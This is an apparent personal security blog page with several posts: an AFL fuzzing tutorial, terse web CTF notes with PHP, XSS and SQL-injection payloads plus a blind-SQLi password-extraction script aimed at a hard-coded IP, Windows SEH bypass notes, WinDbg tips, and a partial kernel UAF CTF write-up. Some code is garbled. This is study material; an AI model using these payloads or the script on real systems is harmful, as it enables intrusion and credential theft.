<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8" />
  
  <title>Page 2 | Another&#39;s blog</title>
  <meta name="author" content="another" />

  

  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

  
  <meta property="og:site_name" content="Another&#39;s blog" />

  
  

  
    <meta property="og:image" content="" />
  

  
  <link href="/css/images/favicon.ico" rel="icon" />
  

  <link rel="alternate" href="/atom.xml" title="Another&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  


  <!-- baidu webmaster push -->
  <script src='//push.zhanzhang.baidu.com/push.js'></script>

</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">Another&#39;s blog</a></h1>
  <h2><a href="/"></a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper">
  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/afl/">2018-07-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/07/07/afl/">afl</a></h1>
  

    </header>
    <div class="entry">
      
        <p>afl-fuzz技术初探<br>目录</p>
<p>安装lzma-sdk<br>安装ucl<br>安装zlib<br>编译upx</p>
<p>正文</p>
<p>afl-fuzz技术初探<br>转载请注明出处:<a href="http://www.cnblogs.com/WangAoBo/p/8280352.html" target="_blank" rel="noopener">http://www.cnblogs.com/WangAoBo/p/8280352.html</a></p>
<p>参考了:</p>
<p><a href="http://pwn4.fun/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">http://pwn4.fun/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/</a></p>
<p><a href="http://blog.csdn.net/youkawa/article/details/45696317" target="_blank" rel="noopener">http://blog.csdn.net/youkawa/article/details/45696317</a></p>
<p><a href="https://stfpeak.github.io/2017/06/12/AFL-Cautions/" target="_blank" rel="noopener">https://stfpeak.github.io/2017/06/12/AFL-Cautions/</a></p>
<p><a href="http://blog.csdn.net/abcdyzhang/article/details/53487683" target="_blank" rel="noopener">http://blog.csdn.net/abcdyzhang/article/details/53487683</a></p>
<h1 id="安装afl"><a href="#安装afl" class="headerlink" title="安装afl"></a>安装afl</h1><pre><code>下载最新源码
解压并安装:
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash $make $sudo make all</span><br></pre></td></tr></table></figure>
<h2 id="有源码的afl-fuzz"><a href="#有源码的afl-fuzz" class="headerlink" title="有源码的afl-fuzz"></a>有源码的afl-fuzz</h2><pre><code>这里以fuzz upx为例进行测试

编译upx
upx项目地址([*https://github.com/upx/upx*)
因为afl会对有源码的程序进行重新编译,因此需要修改upx的Makefile
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$git clone https://github.com/upx/upx.git</span><br><span class="line">$cd upx</span><br><span class="line">$vim Makefile</span><br><span class="line">CC = /usr/local/bin/afl-gcc #添加此句</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cd src</span><br><span class="line">$vim Makefile</span><br><span class="line">CXX    ?= /usr/local/bin/afl-g++ #将CXX改成afl-g++</span><br></pre></td></tr></table></figure>
<h3 id="安装lzma-sdk"><a href="#安装lzma-sdk" class="headerlink" title="安装lzma-sdk"></a>安装lzma-sdk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$git submodule update --init --recursive</span><br></pre></td></tr></table></figure>
<h3 id="安装ucl"><a href="#安装ucl" class="headerlink" title="安装ucl"></a>安装ucl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash $cd ucl-1.03 $./configure $make $sudo make install</span><br><span class="line">bash $export UPX_UCCLDIR=&quot;~/ucl-1.03&quot;</span><br></pre></td></tr></table></figure>
<h3 id="安装zlib"><a href="#安装zlib" class="headerlink" title="安装zlib"></a>安装zlib</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$wget http://pkgs.fedoraproject.org/repo/pkgs/zlib/zlib-1.2.11.tar.xz/sha512/b7f50ada138c7f93eb7eb1631efccd1d9f03a5e77b6c13c8b757017b2d462e19d2d3e01c50fad60a4ae1bc86d431f6f94c72c11ff410c25121e571953017cb67/zlib-1.2.11.tar.xz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cd zlib-1.2.11/</span><br><span class="line">$./configure</span><br><span class="line">$sudo make install</span><br></pre></td></tr></table></figure>
<h3 id="编译upx"><a href="#编译upx" class="headerlink" title="编译upx"></a>编译upx</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cd ~/upx</span><br><span class="line">$make all</span><br></pre></td></tr></table></figure>
<p>此时可在/src目录下找到upx.out文件<br>对upx进行fuzz测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cd ~</span><br><span class="line">$mkdir afl_in afl_out</span><br></pre></td></tr></table></figure>
<p>afl_in存放测试用例,afl_out存放fuzz结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cp /usr/bin/file afl_in</span><br><span class="line">$afl-fuzz -i afl_in -o afl_out ~/upx/src/upx.out @@</span><br></pre></td></tr></table></figure></p>
<p>@@会代替测试样本,即相当于执行了upx.out file</p>
<p>对于从stdin获取输入的程序,可以使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># afl-fuzz -i afl_in -o afl_out ./file</span><br></pre></td></tr></table></figure></p>
<h2 id="无源码的afl-fuzz"><a href="#无源码的afl-fuzz" class="headerlink" title="无源码的afl-fuzz"></a>无源码的afl-fuzz</h2><pre><code>对无源码的程序进行fuzz一般有两种方法:
对二进制文件进行插桩
使用-n选项进行传统的fuzz测试
这里主要介绍第一种,该方法是通过afl-qemu实现的.
</code></pre><p>编译afl版的qemu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd qemu_mode </span><br><span class="line">$ ./build_qemu_support.sh</span><br></pre></td></tr></table></figure></p>
<p>另外需要把afl加入环境变量<br>例如：编辑/etc/profile文件，添加CLASSPATH变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/profile </span><br><span class="line">export CLASSPATH=./JAVA_HOME/lib;$JAVA_HOME/jre/lib</span><br></pre></td></tr></table></figure></p>
<h3 id="对readelf进行fuzz"><a href="#对readelf进行fuzz" class="headerlink" title="对readelf进行fuzz"></a>对readelf进行fuzz</h3><p>以readelf为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$mkdir afl_in afl_out</span><br><span class="line">$cp test afl_in</span><br><span class="line">test为自己准备的测试elf</span><br><span class="line">$sudo cp /usr/bin/readelf .</span><br><span class="line">$afl_fuzz -i afl_in -o afl_out -Q readelf -a @@</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/web/">2018-07-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/07/07/web/">随意码的web</a></h1>
  

    </header>
    <div class="entry">
      
        <p>信息收集</p>
<p>.git</p>
<p>.svn</p>
<p>.robots.txt</p>
<p>.swp vim的暂存</p>
<p>压缩文件</p>
<p>php</p>
<p>变量覆盖</p>
<p>extract()</p>
<p>$$k</p>
<p>trim去掉空格 除了0xf</p>
<p>parse_str()解析字符串为变量</p>
<p>== 类型不一定等 ===类型也要等</p>
<p>sha1加密失败返回NULL</p>
<p>switch没有break</p>
<p>array转换int 0或者1 </p>
<p>0e科学计数法</p>
<p>ox 或者0x开头字符串等于16进制</p>
<p>%00截断</p>
<p>两个number可以绕过后一个</p>
<p>php伪协议</p>
<p>a=data:text/plain,&lt;?php&gt;</p>
<p>php://input enctype=”multipart/from-data”无效</p>
<p>php://filter/read=string.tolower/resource=test.php</p>
<p>include_once(“flag.php”);</p>
<p>反序列化</p>
<p>session反序列化 上传名字为序列化的文件</p>
<p>hackbar</p>
<p>xss </p>
<p>绕过</p>
<p>“data:text/javascript，alert(3);”</p>
<p>us-ascii</p>
<p>utf-7</p>
<p>multi-byte gbl</p>
<p>宽字节</p>
<p>%3c%27 alert(1) //</p>
<p>反序列化</p>
<p>session反序列化可以先创建个文件在远程</p>
<pre><code>                                  table_scnema

column                     table_name

                              column_name
</code></pre><p>desc   information_schema  {                         schemata                   schem_name</p>
<pre><code>tables                table_schema

                        table_name     
</code></pre><p>?id=1’ and ord(mid(‘select table_name   from information_schema.tables limit 1,1’,1,1))&gt;11%23</p>
<p>import requests</p>
<p>import base64</p>
<p>import time</p>
<p>import string</p>
<p>print ‘a’</p>
<p>def send(url,key1,value1):</p>
<pre><code>value1 = base64.b64encode(value1)


data = {


    key1:value1,


}


response = requests.post(url,data=data)


content = response.content





if &quot;Alix&quot; in content:


    return True


else:


    return False
</code></pre><p>str = string.printable</p>
<p>def main():</p>
<pre><code>found = &quot;&quot;


for i in range(1, 80):





    for j in range(1, 123):






        _username = &quot;nothing&apos; or ascii(mid((select group_concat(password) from users), %d, 1))=%d#&quot; % (i, j)






        _password=&quot;amin&quot;


        print _username


        if send(&apos;http://128.199.224.175:24000/&apos;, &apos;spy_name&apos;,_username):


            found +=chr(j)


            print found


            break
</code></pre><p>main()</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/windows机制/">2018-07-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/07/07/windows机制/">windows机制</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="seh机制"><a href="#seh机制" class="headerlink" title="seh机制"></a>seh机制</h2><pre><code>seh是异常处理程序在eip下方，为单向链表
一直到最后一个函数
sehsafe是windows后加的安全机制
通过检测seh函数地址是否为预先设定的地址来防止溢出
但 没开启sehsafe的函数 加载模块之外的地方 堆区均可无视sehsafe 
可以利用这个特点进行绕过 
sehop检测链表最后一个函数是不是默认处理函数可以伪造链表绕过
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/windbg学习总结/">2018-07-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/07/07/windbg学习总结/">windbg学习总结</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="无法正确输出地址问题"><a href="#无法正确输出地址问题" class="headerlink" title="无法正确输出地址问题"></a>无法正确输出地址问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ReadMemory error for address eeddccee</span><br><span class="line">Use `!address eeddccee&apos; to check validity of the address.</span><br></pre></td></tr></table></figure>
<h1 id="无法正确断下点问题"><a href="#无法正确断下点问题" class="headerlink" title="无法正确断下点问题"></a>无法正确断下点问题</h1><pre><code>address命令正确的指示了该地址为私有堆内存，但该内存页不可访问。
检查注册表：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options，确定已经正确的设置了，
尝试其他多种设置，甚至换工具进行设置，但结依然如此。
难道是机器问题？于是在win732位机器上重复上述过程，
发现是可以正确的打印出堆内存指针被释放的栈回溯的。
但更换其他xp机器依然不能正确显示。
&quot;CTEST* pCTest = new CTEST(); &quot;的栈回溯几率，
即申请堆内存的记录，但始终未找到释放堆内存的记录。
于是再次怀疑xp下的页堆并没有真正启动或启动是有问题的，
于是检查下页堆启动情况：
“ReadMemory error for address eeddccee”，  
且只展示一个Page Heap句柄了，剩下的未展示完全，
但页堆明明白白的现实已经开启，也有了准页堆，
但数据却显示不出来，说明数据可能被破坏，
但测试代码如此简单，而且也被windbg第一时间断下，
不可能去破坏数据，换成6.6.0007.5版即可解决。
试了下果然在xp下顺利输出了用户态栈回溯。
Win7下的 _STACK_TRACE_DATABASE 结构和xp下并不完全相同，
关键的 Buckets（栈回溯记录）的结构偏移改了，
而且原xp下是个数组，但win7下却变成了链表，
故猜测高版本的Windbg在xp下依然使用了win7下的某些数据结构，
从而导致Windbg解析出了问题。
</code></pre><h2 id="无法正确下堆断点"><a href="#无法正确下堆断点" class="headerlink" title="无法正确下堆断点"></a>无法正确下堆断点</h2><pre><code>peb错误
输入如下代码
就可以！gflag
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.sympath srv*C:\symblol*http://msdl.microsoft.com/download/symbols </span><br><span class="line">.reload</span><br></pre></td></tr></table></figure>
<h2 id="active控件分析方法"><a href="#active控件分析方法" class="headerlink" title="active控件分析方法"></a>active控件分析方法</h2><pre><code>alt+e进入oleaut32
ctrl+n 找到DISPCALLFUNC
找到首个 call ecx
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/两道内核/">2018-07-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/07/07/两道内核/">两道内核</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="用户态和内核态切换"><a href="#用户态和内核态切换" class="headerlink" title="用户态和内核态切换"></a>用户态和内核态切换</h1><h2 id="进入"><a href="#进入" class="headerlink" title="进入"></a>进入</h2><pre><code>i.    通过swapgs切换GS段寄存器，
是将GS寄存器值和一个特定位置的值进行交换，
目的是保存GS值，同时将该位置的值作为内核执行时的GS值使用。

ii.    将当前栈顶（用户空间栈顶）记录在CPU独占变量区域里，
将CPU独占区域里记录的内核栈顶放入rsp(esp)。

iii.    通过push保存各寄存器值

iv.    通过汇编指令判断是否是x32_abi（暂时可以忽略这个内容）。

v.    通过系统调用号，跳到全局变量sys_call_table相应位置继续执行相应系统调用。
</code></pre><h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2><pre><code>i.    通过swapgs恢复GS值。

ii.    通过sysretq或者iretq恢复到用户空间进行执行，
如果使用Iretq还需要给出用户空间的一些信息，比如CS值，
eflags标志寄存器值，用户栈顶位置等等信息。
</code></pre><h1 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.    题目分析"></a>1.    题目分析</h1><p>题目给出了3个文件，一个rootfs.cpio一个bzImage和一个boot.sh，boot.sh内容如下：</p>
<p>1.#!/bin/bash<br>2.<br>3.qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append ‘console=ttyS0 root=/dev/ram oops=panic panic=1’ -enable-kvm -monitor /dev/null -m 64M –nographic -smp cores=1,threads=1 -cpu kvm64,+smep</p>
<pre><code>很显然我们需要安装qemu，这个就自己去安装啦。
然后就是一个对qemu的调用，kernel使用了bzImage，
然后用rootfs.cpio作为initrd，
其实就是bzImage是内核的映像，然后rootfs.cpio是根文件的映像。
在远程，也就是使用这个boot.sh打开的qemu环境，
我们能接触到的就是在这个qemu环境里。
qemu环境里有flag，可是我们没有权限读取，
必须是root才有权限读取，显然我们需要进行提权。
通过查看/lib/modules/目录，我们发现有一个babydriver.ko，
通过查看/proc/modules我们可以看到babydriver.ko作为内核模块已经加载进
了内核里，我们还可以看到其加载的地址，很好！
接下来的任务就很显然了，我们需要看懂babydriver.ko干了什么。
init和exit函数没有什么太大的意思，基本上就是设置参数，
初始化设备等等工作，我们的重点是几个函数。不过需要注意，init中设置了/dev/babydev作为设备文件。
</code></pre><p>open函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  __int64 __<span class="function">fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp,__int64 a3, __int64 a4)</span></span></span><br><span class="line">2.  &#123;</span><br><span class="line"><span class="number">3.</span>  <span class="keyword">char</span> *v4; <span class="comment">// rax@1</span></span><br><span class="line"><span class="number">4.</span>  __int64 v5; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">5.</span> </span><br><span class="line"><span class="number">6.</span>  _fentry__(inode, filp, a3, a4);</span><br><span class="line"><span class="number">7.</span>  LODWORD(v4) = kmem_cache_alloc_trace(*((_QWORD*)&amp;kmalloc_caches + <span class="number">6</span>),  <span class="number">0x24000C0</span>LL, <span class="number">64L</span>L);</span><br><span class="line"><span class="number">8.</span>  babydev_struct.device_buf = v4;</span><br><span class="line"><span class="number">9.</span>  babydev_struct.device_buf_len = <span class="number">64L</span>L;</span><br><span class="line"><span class="number">10.</span> printk(<span class="string">"device openn"</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line"><span class="number">11.</span> <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line"><span class="number">12.</span>&#125;</span><br><span class="line">close函数：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>__int64 __<span class="function">fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp, __int64a3, __int64 a4)</span></span></span><br><span class="line">2.  &#123;</span><br><span class="line"><span class="number">3.</span>   <span class="keyword">char</span> *v4; <span class="comment">// rax@1</span></span><br><span class="line"><span class="number">4.</span>  __int64 v5; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">5.</span> </span><br><span class="line"><span class="number">6.</span> _fentry__(inode, filp, a3, a4);</span><br><span class="line"><span class="number">7.</span> LODWORD(v4) = kmem_cache_alloc_trace(*((_QWORD*)&amp;kmalloc_caches + <span class="number">6</span>),  <span class="number">0x24000C0</span>LL, <span class="number">64L</span>L);</span><br><span class="line"><span class="number">8.</span> babydev_struct.device_buf = v4;</span><br><span class="line"><span class="number">9.</span>  babydev_struct.device_buf_len = <span class="number">64L</span>L;</span><br><span class="line"><span class="number">10.</span>  printk(<span class="string">"device openn"</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line"><span class="number">11.</span> <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line"><span class="number">12.</span>&#125;</span><br></pre></td></tr></table></figure>
<p>ioctl函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> __int64 __<span class="function">fastcall <span class="title">babyioctl</span><span class="params">(file *filp, __int64 command, <span class="keyword">unsigned</span> __int64 arg, __int64 a4)</span></span></span><br><span class="line">2. &#123;</span><br><span class="line"><span class="number">3.</span> <span class="keyword">size_t</span> v4; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">4.</span> <span class="keyword">size_t</span> v5; <span class="comment">// rbx@1</span></span><br><span class="line"><span class="number">5.</span> <span class="keyword">char</span> *v6; <span class="comment">// rax@2</span></span><br><span class="line"><span class="number">6.</span> __int64 v7; <span class="comment">// rdx@2</span></span><br><span class="line"><span class="number">7.</span> __int64 result; <span class="comment">// rax@2</span></span><br><span class="line"><span class="number">8.</span> </span><br><span class="line"><span class="number">9.</span> _fentry__(filp, command, arg, a4);</span><br><span class="line"><span class="number">10.</span> v5 = v4;silu</span><br><span class="line"><span class="number">11.</span> <span class="keyword">if</span> ( (_DWORD)command == <span class="number">0x10001</span> )</span><br><span class="line"><span class="number">12.</span> &#123;</span><br><span class="line"><span class="number">13.</span> kfree(babydev_struct.device_buf);</span><br><span class="line"><span class="number">14.</span> LODWORD(v6) = _kmalloc(v5, <span class="number">0x24000C0</span>LL);</span><br><span class="line"><span class="number">15.</span> babydev_struct.device_buf = v6;</span><br><span class="line"><span class="number">16.</span> babydev_struct.device_buf_len = v5;</span><br><span class="line"><span class="number">17.</span> printk(<span class="string">"alloc donen"</span>, <span class="number">0x24000C0</span>LL, v7);</span><br><span class="line"><span class="number">18.</span> result = <span class="number">0L</span>L;</span><br><span class="line"><span class="number">19.</span> &#125;</span><br><span class="line"><span class="number">20.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">21.</span> &#123;</span><br><span class="line"><span class="number">22.</span> printk(&amp;default_arg_is_format_str, v4, v4);</span><br><span class="line"><span class="number">23.</span> result = <span class="number">-22L</span>L;</span><br><span class="line"><span class="number">24.</span> &#125;</span><br><span class="line"><span class="number">25.</span> <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">26.</span>&#125;</span><br><span class="line">write函数：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> <span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line">2.  &#123;</span><br><span class="line"><span class="number">3.</span> <span class="keyword">unsigned</span> __int64 copy_len; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">4.</span> <span class="keyword">ssize_t</span> result; <span class="comment">// rax@2</span></span><br><span class="line"><span class="number">5.</span> <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx@3</span></span><br><span class="line"><span class="number">6.</span> </span><br><span class="line"><span class="number">7.</span> _fentry__(filp, buffer, length, offset);</span><br><span class="line"><span class="number">8.</span> <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line"><span class="number">9.</span> &#123;</span><br><span class="line"><span class="number">10.</span> result = <span class="number">-2L</span>L;</span><br><span class="line"><span class="number">11.</span> <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; copy_len )</span><br><span class="line"><span class="number">12.</span> &#123;</span><br><span class="line"><span class="number">13.</span> v6 = copy_len;</span><br><span class="line"><span class="number">14.</span> copy_from_user(babydev_struct.device_buf, buffer, copy_len);</span><br><span class="line"><span class="number">15.</span> result = v6;</span><br><span class="line"><span class="number">16.</span> &#125;</span><br><span class="line"><span class="number">17.</span> &#125;</span><br><span class="line"><span class="number">18.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">19.</span> &#123;</span><br><span class="line"><span class="number">20.</span> result = <span class="number">-1L</span>L;</span><br><span class="line"><span class="number">21.</span> &#125;</span><br><span class="line"><span class="number">22.</span> <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">23.</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>read函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line">2.  &#123;</span><br><span class="line"><span class="number">3.</span> <span class="keyword">unsigned</span> __int64 copy_len; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">4.</span> <span class="keyword">ssize_t</span> result; <span class="comment">// rax@2</span></span><br><span class="line"><span class="number">5.</span> <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx@3</span></span><br><span class="line"><span class="number">6.</span> </span><br><span class="line"><span class="number">7.</span> _fentry__(filp, buffer, length, offset);</span><br><span class="line"><span class="number">8.</span> <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line"><span class="number">9.</span> &#123;</span><br><span class="line"><span class="number">10.</span> result = <span class="number">-2L</span>L;</span><br><span class="line"><span class="number">11.</span> <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; copy_len )</span><br><span class="line"><span class="number">12.</span> &#123;</span><br><span class="line"><span class="number">13.</span> v6 = copy_len;</span><br><span class="line"><span class="number">14.</span> copy_to_user(buffer, babydev_struct.device_buf, copy_len);</span><br><span class="line"><span class="number">15.</span> result = v6;</span><br><span class="line"><span class="number">16.</span> &#125;</span><br><span class="line"><span class="number">17.</span> &#125;</span><br><span class="line"><span class="number">18.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">19.</span> &#123;</span><br><span class="line"><span class="number">20.</span> result = <span class="number">-1L</span>L;</span><br><span class="line"><span class="number">21.</span> &#125;</span><br><span class="line"><span class="number">22.</span> <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">23.</span>&#125;</span><br></pre></td></tr></table></figure></p>
<pre><code>open的时候kmalloc了一个大小为64的空间，然后size设置为64，release的时候将会释放这个空间。read和write都会先检查buf指针是不是为NULL，不为NULL再检查大小是否满足要求，之后进行read和write操作，也就是向用户空间写或者读。

ioctl比较特殊，首先判断command是不是为0x10001，如果满足，将会释放之前的buf，新分配一个用户决定大小的空间，并且设置为size。

功能基本上就讲完了，乍一看好像没有漏洞，
那是因为用户空间pwn的思维在限制你使用单线程的思维去考虑。
如果是多线程呢？
我们假设我们打开了两个设备文件，也就是调用了两次open，
第一次分配了，第二次其实将会覆盖第一次分配的buf，因为是全局的。
有了这个思维，剩下的就好想了，如果我们release了第一个，
第二个其实就已经是被释放过的了，这样，就造成了一个UAF了。
</code></pre><h1 id="2-题目思路1-0"><a href="#2-题目思路1-0" class="headerlink" title="2.    题目思路1.0"></a>2.    题目思路1.0</h1><pre><code>通过我们对slub分配器的了解，相同大小的会被放在一块，现在我们来想想，一个进程的权限，是由什么定的？相信你们都知道，uid，uid又保存在哪儿呢？答案是cred结构。cred结构在每一个进程中都有一个，并且保存了该进程的权限信息，如果我们能够修改到cred信息，那么事情就很简单了。
